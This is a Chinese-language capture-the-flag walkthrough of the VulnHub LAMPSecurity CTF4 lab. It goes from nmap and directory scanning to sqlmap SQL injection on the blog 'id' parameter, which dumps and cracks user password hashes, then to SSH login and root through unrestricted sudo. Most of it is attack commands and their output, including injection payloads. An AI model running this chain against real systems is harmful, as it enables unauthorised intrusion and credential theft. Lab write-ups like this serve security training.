# lampSecurityCTF4 渗透测试实现

靶机地址：https://www.vulnhub.com/entry/lampsecurity-ctf4,83/

下载地址：https://download.vulnhub.com/lampsecurity/ctf4.zip

## 信息收集：

### 主机发现：

```shell
└─$ nmap -sn 192.168.2.1/24
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-20 19:53 HKT
Nmap scan report for 192.168.2.1
Host is up (0.00072s latency).
Nmap scan report for 192.168.2.2
Host is up (0.00039s latency).
Nmap scan report for 192.168.2.128
Host is up (0.000074s latency).
Nmap scan report for 192.168.2.133
Host is up (0.026s latency).
Nmap done: 256 IP addresses (4 hosts up) scanned in 2.34 seconds

```

参数讲解：

-   `-sn` 使用ping进行扫描，不进行端口扫描，减少被目标机发现的风险

### 端口发现：

```shell
└─$ sudo nmap -sT --min-rate 10000 -p- 192.168.2.133 -oA Scan/sT
[sudo] password for kali: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-20 19:57 HKT
Nmap scan report for 192.168.2.133
Host is up (0.0015s latency).
Not shown: 65512 filtered tcp ports (no-response), 19 filtered tcp ports (host-unreach)
PORT    STATE  SERVICE
22/tcp  open   ssh
25/tcp  open   smtp
80/tcp  open   http
631/tcp closed ipp
MAC Address: 00:0C:29:1A:A2:83 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 13.41 seconds


# 扫描UDP开放端口
└─$ sudo nmap -sU --min-rate 10000 -p- 192.168.2.133 -oA Scan/sU
[sudo] password for kali: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-20 19:58 HKT
Warning: 192.168.2.133 giving up on port because retransmission cap hit (10).
Nmap scan report for 192.168.2.133
Host is up (0.0018s latency).
All 65535 scanned ports on 192.168.2.133 are in ignored states.
Not shown: 65457 open|filtered udp ports (no-response), 78 filtered udp ports (host-prohibited)
MAC Address: 00:0C:29:1A:A2:83 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 72.90 seconds

```

参数讲解：

1.   `-sT` 使用TCP扫描
2.   `--min-rate 10000` 使用10000的速率来进行扫描，相对平衡
3.   `-p-` 扫描全端口
4.   `-sU` 使用UDP扫描
5.   `-oA`  将当前扫描出的内容保存到指定文件中

### 扫描服务及操作系统版本：

```shel
└─$ sudo nmap -sC -sV -O -p22,25,80,631 --min-rate 10000 192.168.2.133 -oA Scan/sC
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-20 20:00 HKT
Nmap scan report for 192.168.2.133
Host is up (0.00037s latency).

PORT    STATE  SERVICE VERSION
22/tcp  open   ssh     OpenSSH 4.3 (protocol 2.0)
| ssh-hostkey: 
|   1024 104a18f897e07227b5a433933daa9def (DSA)
|_  2048 e770d3810041b86efd31ae0e00ea5cb4 (RSA)
25/tcp  open   smtp    Sendmail 8.13.5/8.13.5
| smtp-commands: ctf4.sas.upenn.edu Hello [192.168.2.128], pleased to meet you, ENHANCEDSTATUSCODES, PIPELINING, EXPN, VERB, 8BITMIME, SIZE, DSN, ETRN, DELIVERBY, HELP
|_ 2.0.0 This is sendmail version 8.13.5 2.0.0 Topics: 2.0.0 HELO EHLO MAIL RCPT DATA 2.0.0 RSET NOOP QUIT HELP VRFY 2.0.0 EXPN VERB ETRN DSN AUTH 2.0.0 STARTTLS 2.0.0 For more info use "HELP <topic>". 2.0.0 To report bugs in the implementation send email to 2.0.0 sendmail-bugs@sendmail.org. 2.0.0 For local information send email to Postmaster at your site. 2.0.0 End of HELP info
80/tcp  open   http    Apache httpd 2.2.0 ((Fedora))
|_http-title:  Prof. Ehks 
| http-robots.txt: 5 disallowed entries 
|_/mail/ /restricted/ /conf/ /sql/ /admin/
|_http-server-header: Apache/2.2.0 (Fedora)
631/tcp closed ipp
MAC Address: 00:0C:29:1A:A2:83 (VMware)
Device type: general purpose|proxy server|remote management|terminal server|switch|WAP
Running (JUST GUESSING): Linux 2.6.X|3.X|4.X (98%), SonicWALL embedded (95%), Control4 embedded (95%), Lantronix embedded (95%), Dell iDRAC 6 (94%), SNR embedded (94%)
OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:sonicwall:aventail_ex-6000 cpe:/h:lantronix:slc_8 cpe:/o:dell:idrac6_firmware cpe:/h:snr:snr-s2960 cpe:/o:linux:linux_kernel:3.10 cpe:/o:linux:linux_kernel:4.1
Aggressive OS guesses: Linux 2.6.16 - 2.6.21 (98%), Linux 2.6.13 - 2.6.32 (96%), SonicWALL Aventail EX-6000 VPN appliance (95%), Control4 HC-300 home controller (95%), Lantronix SLC 8 terminal server (Linux 2.6) (95%), Linux 2.6.8 - 2.6.30 (94%), Linux 2.6.9 - 2.6.18 (94%), Dell iDRAC 6 remote access controller (Linux 2.6) (94%), SNR SNR-S2960 switch (94%), Linux 2.6.18 - 2.6.32 (94%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: Host: ctf4.sas.upenn.edu; OS: Unix

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.33 seconds

```

参数讲解：

1.   `-sV` 探测当前的服务版本
2.   `-sC` 调用默认的脚本进行漏洞探测
3.   `-O` 探测目标操作系统版本
4.   `-p `  指定端口进行扫描

### 调用默认脚本进行漏洞探测

```shel
└─$ sudo nmap --script=vuln -p22,25,80,631 192.168.2.133 -oA Scan/Script
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-20 20:02 HKT
Pre-scan script results:
| broadcast-avahi-dos: 
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).

Nmap scan report for 192.168.2.133
Host is up (0.00056s latency).

PORT    STATE  SERVICE
22/tcp  open   ssh
25/tcp  open   smtp
| smtp-vuln-cve2010-4344: 
|_  The SMTP server is not Exim: NOT VULNERABLE
80/tcp  open   http
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-sql-injection: 
|   Possible sqli for queries:
|     http://192.168.2.133:80/?title=Blog&id=5%27%20OR%20sqlspider&page=blog
|     http://192.168.2.133:80/?title=Blog&id=6%27%20OR%20sqlspider&page=blog
|     http://192.168.2.133:80/?title=Blog&id=7%27%20OR%20sqlspider&page=blog
|_    http://192.168.2.133:80/?title=Blog&id=2%27%20OR%20sqlspider&page=blog
| http-csrf: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.2.133
|   Found the following possible CSRF vulnerabilities: 
|     
|     Path: http://192.168.2.133:80/
|     Form id: 
|     Form action: /index.html?page=search&title=Search Results
|     
|     Path: http://192.168.2.133:80/index.html?page=search&title=Search Results
|     Form id: 
|     Form action: /index.html?page=search&title=Search Results
|     
|     Path: http://192.168.2.133:80/index.html?page=blog&title=Blog
|     Form id: 
|     Form action: /index.html?page=search&title=Search Results
|     
|     Path: http://192.168.2.133:80/index.html?title=Home Page
|     Form id: 
|     Form action: /index.html?page=search&title=Search Results
|     
|     Path: http://192.168.2.133:80/index.html?page=contact&title=Contact
|     Form id: 
|     Form action: /index.html?page=search&title=Search Results
|     
|     Path: http://192.168.2.133:80/index.html?page=research&title=Research
|     Form id: 
|     Form action: /index.html?page=search&title=Search Results
|     
|     Path: http://192.168.2.133:80/?page=blog&title=Blog&id=5
|     Form id: 
|     Form action: /index.html?page=search&title=Search Results
|     
|     Path: http://192.168.2.133:80/?page=blog&title=Blog&id=6
|     Form id: 
|     Form action: /index.html?page=search&title=Search Results
|     
|     Path: http://192.168.2.133:80/?page=blog&title=Blog&id=7
|     Form id: 
|     Form action: /index.html?page=search&title=Search Results
|     
|     Path: http://192.168.2.133:80/?page=blog&title=Blog&id=2
|     Form id: 
|_    Form action: /index.html?page=search&title=Search Results
|_http-trace: TRACE is enabled
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       http://ha.ckers.org/slowloris/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
| http-enum: 
|   /admin/: Possible admin folder
|   /admin/index.php: Possible admin folder
|   /admin/login.php: Possible admin folder
|   /admin/admin.php: Possible admin folder
|   /robots.txt: Robots file
|   /icons/: Potentially interesting directory w/ listing on 'apache/2.2.0 (fedora)'
|   /images/: Potentially interesting directory w/ listing on 'apache/2.2.0 (fedora)'
|   /inc/: Potentially interesting directory w/ listing on 'apache/2.2.0 (fedora)'
|   /pages/: Potentially interesting directory w/ listing on 'apache/2.2.0 (fedora)'
|   /restricted/: Potentially interesting folder (401 Authorization Required)
|   /sql/: Potentially interesting directory w/ listing on 'apache/2.2.0 (fedora)'
|_  /usage/: Potentially interesting folder
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
631/tcp closed ipp
MAC Address: 00:0C:29:1A:A2:83 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 168.86 seconds

```

-   疑似发现`sql注入` 直接一把梭

参数讲解：
	`--script-vuln`是Nmap调用的一个漏洞扫描脚本集合，用于检测已知漏洞。以下是其中一些脚本的简要介绍：

1. `http-vuln-*`：用于检测Web应用程序中已知的漏洞，包括SQL注入、文件包含、远程命令执行等。

2. `ssl-*`：用于检测SSL和TLS协议中的漏洞，包括心脏滴血漏洞、POODLE漏洞、BEAST漏洞等。

3. `smb-vuln-*`：用于检测Windows SMB协议中的漏洞，包括EternalBlue漏洞、MS17-010漏洞等。

4. `smtp-vuln-*`：用于检测SMTP协议中的漏洞，包括OpenSMTPD漏洞、Exim漏洞等。

5. `dns-*`：用于检测DNS协议中的漏洞，包括DNS隧道、DNS缓存投毒等。

6. `ssh-*`：用于检测SSH协议中的漏洞，包括SSH漏洞、SSH弱口令等。

7. `ftp-*`：用于检测FTP协议中的漏洞，包括ProFTPD漏洞、VSFTPD漏洞等。

这些脚本的使用方法类似于普通的Nmap扫描，只需在命令中加入`--script vuln`参数即可调用。例如：

nmap -sV --script vuln <target>

这将对目标进行端口扫描，并调用`--script=vuln`中的所有漏洞扫描脚本进行检测。需要注意的是，漏洞扫描脚本可能会产生误报或漏报，因此在实际应用中应该结合其他漏洞扫描工具和手动渗透测试进行综合评估。

## web目录扫描及发现

-   调用`gobuster`进行扫描

```shell
└─$ sudo gobuster dir -u http://192.168.2.133 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt  
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.2.133
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/05/20 20:03:16 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 314] [--> http://192.168.2.133/images/]
/pages                (Status: 301) [Size: 313] [--> http://192.168.2.133/pages/]
/calendar             (Status: 301) [Size: 316] [--> http://192.168.2.133/calendar/]
/mail                 (Status: 301) [Size: 312] [--> http://192.168.2.133/mail/]
/admin                (Status: 301) [Size: 313] [--> http://192.168.2.133/admin/]
/usage                (Status: 301) [Size: 313] [--> http://192.168.2.133/usage/]
/conf                 (Status: 500) [Size: 616]
/inc                  (Status: 301) [Size: 311] [--> http://192.168.2.133/inc/]
/sql                  (Status: 301) [Size: 311] [--> http://192.168.2.133/sql/]
/restricted           (Status: 401) [Size: 479]
Progress: 220396 / 220561 (99.93%)
===============================================================
2023/05/20 20:04:54 Finished
===============================================================
                                                
```

参数讲解：

1.   `dir` 指定是以查找文件(文件夹)的形式进行扫描
2.   `-u`  指定需要扫描的目标
3.   `-w`  指定需要使用的字典文件进行目录扫描

-   调用`dirb`进行扫描

```shell
└─$ dirb http://192.168.2.133 

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sat May 20 20:07:04 2023
URL_BASE: http://192.168.2.133/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.2.133/ ----
==> DIRECTORY: http://192.168.2.133/admin/                                                          
==> DIRECTORY: http://192.168.2.133/calendar/                                                       
+ http://192.168.2.133/cgi-bin/ (CODE:403|SIZE:288)                                                 
+ http://192.168.2.133/conf (CODE:500|SIZE:616)                                                     
==> DIRECTORY: http://192.168.2.133/images/                                                         
==> DIRECTORY: http://192.168.2.133/inc/                                                            
+ http://192.168.2.133/index.html (CODE:200|SIZE:3479)                                              
==> DIRECTORY: http://192.168.2.133/mail/                                                           
==> DIRECTORY: http://192.168.2.133/pages/                                                          
+ http://192.168.2.133/restricted (CODE:401|SIZE:479)                                               
+ http://192.168.2.133/robots.txt (CODE:200|SIZE:104)                                               
==> DIRECTORY: http://192.168.2.133/sql/                                                            
==> DIRECTORY: http://192.168.2.133/usage/                                                          
---- Entering directory: http://192.168.2.133/admin/ ----
+ http://192.168.2.133/admin/admin.php (CODE:200|SIZE:51)                                           
==> DIRECTORY: http://192.168.2.133/admin/inc/                                                      
+ http://192.168.2.133/admin/index.php (CODE:200|SIZE:1907)                                                                             
---- Entering directory: http://192.168.2.133/calendar/ ----
==> DIRECTORY: http://192.168.2.133/calendar/adodb/                                                 
==> DIRECTORY: http://192.168.2.133/calendar/includes/                                              
+ http://192.168.2.133/calendar/index.php (CODE:200|SIZE:10259)                                     
==> DIRECTORY: http://192.168.2.133/calendar/locale/                                                
+ http://192.168.2.133/calendar/README (CODE:200|SIZE:552)                                          
+ http://192.168.2.133/calendar/TODO (CODE:200|SIZE:783)                                            
---- Entering directory: http://192.168.2.133/images/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                    
---- Entering directory: http://192.168.2.133/inc/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                    
---- Entering directory: http://192.168.2.133/mail/ ----
+ http://192.168.2.133/mail/ChangeLog (CODE:200|SIZE:87043)                                         
==> DIRECTORY: http://192.168.2.133/mail/class/                                                     
==> DIRECTORY: http://192.168.2.133/mail/config/                                                    
+ http://192.168.2.133/mail/configure (CODE:200|SIZE:102)                                           
==> DIRECTORY: http://192.168.2.133/mail/contrib/                                                   
+ http://192.168.2.133/mail/data (CODE:403|SIZE:289)                                                
==> DIRECTORY: http://192.168.2.133/mail/doc/                                                       
==> DIRECTORY: http://192.168.2.133/mail/functions/                                                 
==> DIRECTORY: http://192.168.2.133/mail/help/                                                      
==> DIRECTORY: http://192.168.2.133/mail/images/                                                    
==> DIRECTORY: http://192.168.2.133/mail/include/                                                   
+ http://192.168.2.133/mail/index.php (CODE:302|SIZE:0)                                             
==> DIRECTORY: http://192.168.2.133/mail/locale/                                                    
==> DIRECTORY: http://192.168.2.133/mail/plugins/                                                   
+ http://192.168.2.133/mail/README (CODE:200|SIZE:3214)                                             
==> DIRECTORY: http://192.168.2.133/mail/src/                                                       
==> DIRECTORY: http://192.168.2.133/mail/themes/                                                    
---- Entering directory: http://192.168.2.133/calendar/includes/ ----
+ http://192.168.2.133/calendar/includes/admin.php (CODE:200|SIZE:0)                                
+ http://192.168.2.133/calendar/includes/index.html (CODE:200|SIZE:0)                               
---- Entering directory: http://192.168.2.133/calendar/locale/ ----
==> DIRECTORY: http://192.168.2.133/calendar/locale/de/                                             
==> DIRECTORY: http://192.168.2.133/calendar/locale/de_DE/                                          
+ http://192.168.2.133/calendar/locale/index.html (CODE:200|SIZE:0)                                 
---- Entering directory: http://192.168.2.133/mail/class/ ----
==> DIRECTORY: http://192.168.2.133/mail/class/helper/                                              
+ http://192.168.2.133/mail/class/index.php (CODE:302|SIZE:0)                                       
---- Entering directory: http://192.168.2.133/mail/config/ ----
+ http://192.168.2.133/mail/config/index.php (CODE:302|SIZE:0)                                      
---- Entering directory: http://192.168.2.133/mail/contrib/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                  
---- Entering directory: http://192.168.2.133/mail/doc/ ----
+ http://192.168.2.133/mail/doc/index.html (CODE:200|SIZE:3065)                                     
---- Entering directory: http://192.168.2.133/mail/functions/ ----
==> DIRECTORY: http://192.168.2.133/mail/functions/decode/                                          
==> DIRECTORY: http://192.168.2.133/mail/functions/encode/                                          
+ http://192.168.2.133/mail/functions/index.php (CODE:302|SIZE:0)                                   
---- Entering directory: http://192.168.2.133/mail/help/ ----
==> DIRECTORY: http://192.168.2.133/mail/help/en_US/                                                
+ http://192.168.2.133/mail/help/index.php (CODE:302|SIZE:0)                                        
---- Entering directory: http://192.168.2.133/mail/images/ ----
+ http://192.168.2.133/mail/images/index.php (CODE:302|SIZE:0)                                      
---- Entering directory: http://192.168.2.133/mail/include/ ----
+ http://192.168.2.133/mail/include/index.php (CODE:302|SIZE:0)                                     
==> DIRECTORY: http://192.168.2.133/mail/include/options/                                                                               
---- Entering directory: http://192.168.2.133/mail/locale/ ----
+ http://192.168.2.133/mail/locale/index.php (CODE:302|SIZE:0)                                      
---- Entering directory: http://192.168.2.133/mail/plugins/ ----
==> DIRECTORY: http://192.168.2.133/mail/plugins/administrator/                                     
==> DIRECTORY: http://192.168.2.133/mail/plugins/calendar/                                          
==> DIRECTORY: http://192.168.2.133/mail/plugins/demo/                                              
==> DIRECTORY: http://192.168.2.133/mail/plugins/fortune/                                           
+ http://192.168.2.133/mail/plugins/index.php (CODE:302|SIZE:0)                                     
==> DIRECTORY: http://192.168.2.133/mail/plugins/info/                                              
==> DIRECTORY: http://192.168.2.133/mail/plugins/test/                                              
==> DIRECTORY: http://192.168.2.133/mail/plugins/translate/                                         
---- Entering directory: http://192.168.2.133/mail/src/ ----
+ http://192.168.2.133/mail/src/index.php (CODE:302|SIZE:0)                                         
---- Entering directory: http://192.168.2.133/mail/themes/ ----
==> DIRECTORY: http://192.168.2.133/mail/themes/css/                                                
+ http://192.168.2.133/mail/themes/index.php (CODE:302|SIZE:0)                                      
---- Entering directory: http://192.168.2.133/calendar/locale/de/ ----
+ http://192.168.2.133/calendar/locale/de/index.html (CODE:200|SIZE:0)                              
---- Entering directory: http://192.168.2.133/calendar/locale/de_DE/ ----
+ http://192.168.2.133/calendar/locale/de_DE/index.html (CODE:200|SIZE:0)                           
---- Entering directory: http://192.168.2.133/mail/class/helper/ ----
+ http://192.168.2.133/mail/class/helper/index.php (CODE:302|SIZE:0)                                
---- Entering directory: http://192.168.2.133/mail/functions/decode/ ----
+ http://192.168.2.133/mail/functions/decode/index.php (CODE:302|SIZE:0)                            
---- Entering directory: http://192.168.2.133/mail/functions/encode/ ----
+ http://192.168.2.133/mail/functions/encode/index.php (CODE:302|SIZE:0)                            
---- Entering directory: http://192.168.2.133/mail/help/en_US/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                   
---- Entering directory: http://192.168.2.133/mail/include/options/ ----
+ http://192.168.2.133/mail/include/options/index.php (CODE:302|SIZE:0)                                                            
---- Entering directory: http://192.168.2.133/mail/plugins/administrator/ ----
+ http://192.168.2.133/mail/plugins/administrator/index.php (CODE:302|SIZE:0)                       
---- Entering directory: http://192.168.2.133/mail/plugins/calendar/ ----
+ http://192.168.2.133/mail/plugins/calendar/index.php (CODE:302|SIZE:0)                            
+ http://192.168.2.133/mail/plugins/calendar/README (CODE:200|SIZE:887)                             
---- Entering directory: http://192.168.2.133/mail/plugins/demo/ ----
+ http://192.168.2.133/mail/plugins/demo/index.php (CODE:302|SIZE:0)                                
+ http://192.168.2.133/mail/plugins/demo/README (CODE:200|SIZE:837)                                                                  
---- Entering directory: http://192.168.2.133/mail/plugins/fortune/ ----
+ http://192.168.2.133/mail/plugins/fortune/index.php (CODE:302|SIZE:0)                             
+ http://192.168.2.133/mail/plugins/fortune/README (CODE:200|SIZE:485)                              
---- Entering directory: http://192.168.2.133/mail/plugins/info/ ----
+ http://192.168.2.133/mail/plugins/info/index.php (CODE:302|SIZE:0)                                
+ http://192.168.2.133/mail/plugins/info/README (CODE:200|SIZE:1632)                                
---- Entering directory: http://192.168.2.133/mail/plugins/test/ ----
+ http://192.168.2.133/mail/plugins/test/index.php (CODE:302|SIZE:0)                                
+ http://192.168.2.133/mail/plugins/test/README (CODE:200|SIZE:505)                                                                  
---- Entering directory: http://192.168.2.133/mail/plugins/translate/ ----
+ http://192.168.2.133/mail/plugins/translate/index.php (CODE:302|SIZE:0)                           
+ http://192.168.2.133/mail/plugins/translate/README (CODE:200|SIZE:1730)                                                             
---- Entering directory: http://192.168.2.133/mail/themes/css/ ----
+ http://192.168.2.133/mail/themes/css/index.php (CODE:302|SIZE:0)                                                                       
-----------------
END_TIME: Sat May 20 20:12:36 2023
DOWNLOADED: 147584 - FOUND: 50

```

### sql注入

-   获取当前数据库存在的库信息

-   ```shell
    └─$ sqlmap -u "http://192.168.2.133/index.html?page=blog&title=Blog&id=1" --dbs 
    
    [21:16:49] [INFO] fetching database names
    [21:16:49] [INFO] fetching number of databases
    [21:16:49] [INFO] resumed: 6
    [21:16:49] [INFO] resumed: information_schema
    [21:16:49] [INFO] resumed: calendar
    [21:16:49] [INFO] resumed: ehks
    [21:16:49] [INFO] resumed: mysql
    [21:16:49] [INFO] resumed: roundcubemail
    [21:16:49] [INFO] resumed: test
    available databases [6]:
    [*] calendar
    [*] ehks
    [*] information_schema
    [*] mysql
    [*] roundcubemail
    [*] test
    
    ```

-   获取当前库中存在哪些表

-   ```shell
    └─$ sqlmap -u "http://192.168.2.133/index.html?page=blog&title=Blog&id=1" -D ehks --tables
    
    [21:08:55] [INFO] resuming back-end DBMS 'mysql' 
    [21:08:55] [INFO] testing connection to the target URL
    sqlmap resumed the following injection point(s) from stored session:
    ---
    Parameter: id (GET)
        Type: boolean-based blind
        Title: Boolean-based blind - Parameter replace (original value)
        Payload: page=blog&title=Blog&id=(SELECT (CASE WHEN (7976=7976) THEN 1 ELSE (SELECT 1049 UNION SELECT 3694) END))
    
        Type: time-based blind
        Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
        Payload: page=blog&title=Blog&id=1 AND (SELECT 3170 FROM (SELECT(SLEEP(5)))BybL)
    ---
    [21:08:55] [INFO] the back-end DBMS is MySQL
    web server operating system: Linux Fedora 5 (Bordeaux)
    web application technology: PHP 5.1.2, Apache 2.2.0
    back-end DBMS: MySQL >= 5.0.12
    [21:08:55] [INFO] fetching tables for database: 'ehks'
    [21:08:55] [INFO] fetching number of tables for database 'ehks'
    [21:08:55] [INFO] resumed: 3
    [21:08:55] [INFO] resumed: blog
    [21:08:55] [INFO] resumed: comment
    [21:08:55] [INFO] resumed: user
    Database: ehks
    [3 tables]
    +---------+
    | user    |
    | blog    |
    | comment |
    +---------+
    ```

-   获取当前表中有哪些字段

-   ```shell
    └─$ sqlmap -u "http://192.168.2.133/index.html?page=blog&title=Blog&id=1" -D ehks -T user -columns
                                                                 
    Database: ehks
    Table: user
    [4 columns]
    +-----------+-------------+
    | Column    | Type        |
    +-----------+-------------+
    | blog_id   | numeric     |
    | user_id   | numeric     |
    | user_name | non-numeric |
    | user_pass | non-numeric |
    +-----------+-------------+
    
    [21:10:14] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/192.168.2.133'
    
    [*] ending @ 21:10:14 /2023-05-21/
    ```

-   获取`user`表的`user_name user_pass`字段的内容并进行暴力破解

-   ```shell
    
    └─$ sqlmap -u "http://192.168.2.133/index.html?page=blog&title=Blog&id=1" -D ehks -T user -C 'user_name,user_pass' --dump
    
    
    Database: ehks
    Table: user
    [6 entries]
    +-----------+--------------------------------------------------+
    | user_name | user_pass                                        |
    +-----------+--------------------------------------------------+
    | achen     | b46265f1e7faa3beab09db5c28739380 (seventysixers) |
    | dstevens  | 02e823a15a392b5aa4ff4ccb9060fa68 (ilike2surf)    |
    | ghighland | 9f3eb3087298ff21843cc4e013cf355f (undone1)       |
    | jdurbin   | 7c7bc9f465d86b8164686ebb5151a717 (Sue1978)       |
    | pmoore    | 8f4743c04ed8e5f39166a81f26319bb5 (Homesite)      |
    | sorzek    | 64d1f88b9b276aece4b0edcc25b7a434 (pacman)        |
    +-----------+--------------------------------------------------+
    ```



### 使用ssh进行登陆尝试并获得shell

-   初次登陆发现登陆失败，需要指定的密钥类型

-   ```shell
    └─$ ssh achen@192.168.2.133                                                                                              
    Unable to negotiate with 192.168.2.133 port 22: no matching key exchange method found. Their offer: diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1
    ```

-   设置客户端的密钥类型,发现还需要指定一个匹配的主机密钥类型

-   ```shell
    └─$ ssh -oKexAlgorithms=diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1  achen@192.168.2.133       
    Unable to negotiate with 192.168.2.133 port 22: no matching host key type found. Their offer: ssh-rsa,ssh-dss
    ```

-   指定匹配的密钥类型

-   ```shell
    └─$ ssh -oKexAlgorithms=diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1 -oHostKeyAlgorithms=ssh-rsa,ssh-dss achen@192.168.2.133
    BSD SSH 4.1
    achen@192.168.2.133's password: 
    Last login: Sat May 20 08:47:04 2023 from 192.168.2.128
    [achen@ctf4 ~]$ 
    ```

-   登陆成功，获得shell，尝试提权. 

-   ```shell
    └─$ ssh -oKexAlgorithms=diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1 -oHostKeyAlgorithms=ssh-rsa,ssh-dss achen@192.168.2.133
    BSD SSH 4.1
    achen@192.168.2.133's password: 
    Last login: Sat May 20 08:47:04 2023 from 192.168.2.128
    [achen@ctf4 ~]$ whoami
    achen
    [achen@ctf4 ~]$ ip a
    -bash: ip: command not found
    [achen@ctf4 ~]$ ifconfig
    -bash: ifconfig: command not found
    [achen@ctf4 ~]$ uname -a
    Linux ctf4.sas.upenn.edu 2.6.15-1.2054_FC5 #1 Tue Mar 14 15:48:33 EST 2006 i686 i686 i386 GNU/Linux
    [achen@ctf4 ~]$ lsb_release -a
    LSB Version:    :core-3.0-ia32:core-3.0-noarch:graphics-3.0-ia32:graphics-3.0-noarch
    Distributor ID: FedoraCore
    Description:    Fedora Core release 5 (Bordeaux)
    Release:        5
    Codename:       Bordeaux
    [achen@ctf4 ~]$ sudo -l
    User achen may run the following commands on this host:
        (ALL) NOPASSWD: ALL
    [achen@ctf4 ~]$ sudo /bin/bash
    [root@ctf4 ~]# ipconfig
    bash: ipconfig: command not found
    [root@ctf4 ~]# ip addr
    bash: ip: command not found
    [root@ctf4 ~]# 
    
    ```

-   获得root权限！
